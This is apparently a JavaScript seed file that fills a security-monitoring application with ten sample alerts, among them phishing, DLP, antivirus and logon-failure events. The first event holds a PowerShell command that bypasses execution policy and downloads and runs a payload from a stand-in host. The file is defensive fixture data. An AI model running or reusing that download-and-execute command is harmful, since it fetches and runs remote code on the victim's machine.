const { models } = require('../models/index');

const seedSecurityEvents = async (organizationId, assets) => {
  const securityEventsData = [
    {
      id: '550e8400-e29b-41d4-a716-446655440080',
      eventTime: new Date('2024-01-15T10:30:00Z'),
      source: 'Windows Defender ATP',
      eventType: 'ProcessCreation',
      severity: 5,
      sourceIp: '10.0.1.10',
      userName: 'SYSTEM',
      assetId: assets[0].id,
      assetName: assets[0].name,
      rawLog: 'Process Create: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious-site.com/payload\')"',
      parsedData: {
        eventId: 1,
        processName: 'powershell.exe',
        commandLine: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious-site.com/payload\')"',
        parentProcess: 'winlogon.exe',
        parentPid: 624,
        processId: 3456,
        userId: 'SYSTEM',
        logonId: '0x3e7',
        terminalSessionId: 0
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440081',
      eventTime: new Date('2024-01-15T09:45:00Z'),
      source: 'Firewall',
      eventType: 'NetworkConnection',
      severity: 4,
      sourceIp: '10.0.1.20',
      destinationIp: '185.220.100.240',
      assetId: assets[1].id,
      assetName: assets[1].name,
      rawLog: 'ALLOW TCP 10.0.1.20:49152 -> 185.220.100.240:443 (2048 bytes)',
      parsedData: {
        action: 'ALLOW',
        protocol: 'TCP',
        sourcePort: 49152,
        destinationPort: 443,
        bytes: 2048,
        duration: 45,
        packets: 12,
        rule: 'HTTPS_OUT'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440082',
      eventTime: new Date('2024-01-15T11:15:00Z'),
      source: 'Windows Event Log',
      eventType: 'LogonFailure',
      severity: 3,
      sourceIp: '203.0.113.45',
      userName: 'administrator',
      assetId: assets[0].id,
      assetName: assets[0].name,
      rawLog: 'An account failed to log on. Subject: Security ID: NULL SID Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: NULL SID Account Name: administrator Account Domain: DEMO',
      parsedData: {
        eventId: 4625,
        logonType: 3,
        failureReason: 'Unknown user name or bad password',
        status: '0xC000006D',
        subStatus: '0xC000006A',
        processName: 'NtLmSsp',
        authenticationPackage: 'NTLM',
        workstationName: 'ATTACKER-PC'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440083',
      eventTime: new Date('2024-01-15T08:30:00Z'),
      source: 'DLP System',
      eventType: 'DataTransfer',
      severity: 4,
      sourceIp: '10.0.2.15',
      userName: 'jsmith',
      assetId: assets[3].id,
      assetName: assets[3].name,
      rawLog: 'DLP Alert: Large file transfer detected - customer_database.zip (2.5GB) to external destination dropbox.com',
      parsedData: {
        fileName: 'customer_database.zip',
        fileSize: 2684354560,
        destination: 'dropbox.com',
        transferMethod: 'HTTPS',
        dataClassification: 'Confidential',
        recordCount: 50000,
        contentType: 'database',
        policy: 'PII_Protection'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440084',
      eventTime: new Date('2024-01-15T12:00:00Z'),
      source: 'Antivirus',
      eventType: 'MalwareDetection',
      severity: 4,
      sourceIp: '10.0.2.25',
      assetId: assets[3].id,
      assetName: assets[3].name,
      rawLog: 'Threat detected and quarantined: Win32.Trojan.Generic in C:\\Users\\mwilson\\Downloads\\invoice.pdf.exe',
      parsedData: {
        threatName: 'Win32.Trojan.Generic',
        filePath: 'C:\\Users\\mwilson\\Downloads\\invoice.pdf.exe',
        action: 'quarantined',
        fileSize: 2048576,
        fileHash: 'a1b2c3d4e5f6789012345678901234567890abcdef',
        detectionMethod: 'signature',
        confidence: 95
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440085',
      eventTime: new Date('2024-01-15T14:30:00Z'),
      source: 'Web Proxy',
      eventType: 'WebRequest',
      severity: 3,
      sourceIp: '10.0.2.30',
      userName: 'rjohnson',
      assetId: assets[3].id,
      assetName: assets[3].name,
      rawLog: 'BLOCKED: https://evil-updates.com/windows-security-update.exe - Category: Malware',
      parsedData: {
        url: 'https://evil-updates.com/windows-security-update.exe',
        action: 'BLOCKED',
        category: 'Malware',
        method: 'GET',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        referrer: 'https://fake-microsoft.com/updates',
        responseCode: 403,
        contentType: 'application/octet-stream'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440086',
      eventTime: new Date('2024-01-15T15:45:00Z'),
      source: 'Email Security',
      eventType: 'PhishingDetection',
      severity: 3,
      sourceIp: '198.51.100.50',
      userName: 'support@demo.corp',
      assetId: assets[1].id,
      assetName: assets[1].name,
      rawLog: 'Phishing email quarantined: From: phishing@scammer.net To: support@demo.corp Subject: Urgent Security Update Required',
      parsedData: {
        sender: 'phishing@scammer.net',
        recipient: 'support@demo.corp',
        subject: 'Urgent Security Update Required',
        action: 'quarantined',
        attachments: 1,
        attachmentName: 'security-update.exe',
        phishingScore: 89,
        spamScore: 76,
        malwareDetected: true
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440087',
      eventTime: new Date('2024-01-15T16:20:00Z'),
      source: 'Database Audit',
      eventType: 'DatabaseAccess',
      severity: 2,
      sourceIp: '10.0.1.30',
      userName: 'db_admin',
      assetId: assets[4].id,
      assetName: assets[4].name,
      rawLog: 'Database query executed: SELECT * FROM customers WHERE created_date > \'2024-01-01\' LIMIT 10000',
      parsedData: {
        query: 'SELECT * FROM customers WHERE created_date > \'2024-01-01\' LIMIT 10000',
        database: 'customer_db',
        table: 'customers',
        operation: 'SELECT',
        recordsAccessed: 10000,
        executionTime: 2.34,
        connectionId: 'conn_12345',
        clientApplication: 'pgAdmin'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440088',
      eventTime: new Date('2024-01-15T17:00:00Z'),
      source: 'VPN Server',
      eventType: 'VPNConnection',
      severity: 1,
      sourceIp: '198.51.100.75',
      userName: 'mwilson',
      assetId: assets[2].id,
      assetName: assets[2].name,
      rawLog: 'VPN connection established: User mwilson connected from 198.51.100.75 to 10.0.0.1',
      parsedData: {
        connectionType: 'OpenVPN',
        protocol: 'UDP',
        port: 1194,
        bytesReceived: 1048576,
        bytesSent: 2097152,
        sessionDuration: 3600,
        encryption: 'AES-256',
        compression: 'LZO',
        assignedIP: '10.0.100.15'
      },
      organizationId,
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440089',
      eventTime: new Date('2024-01-15T18:15:00Z'),
      source: 'System Monitor',
      eventType: 'SystemAnomaly',
      severity: 2,
      sourceIp: '10.0.1.20',
      assetId: assets[1].id,
      assetName: assets[1].name,
      rawLog: 'Unusual CPU usage detected: 95% usage sustained for 30 minutes',
      parsedData: {
        metric: 'CPU_Usage',
        value: 95,
        threshold: 80,
        duration: 1800,
        processes: [
          { name: 'apache2', cpu: 45.2, pid: 1234 },
          { name: 'mysql', cpu: 38.7, pid: 5678 },
          { name: 'unknown_process', cpu: 11.1, pid: 9999 }
        ],
        memoryUsage: 78,
        diskIO: 'high'
      },
      organizationId,
    },
  ];

  const securityEvents = await models.SecurityEvent.bulkCreate(securityEventsData, {
    returning: true,
  });

  return securityEvents;
};

module.exports = { seedSecurityEvents };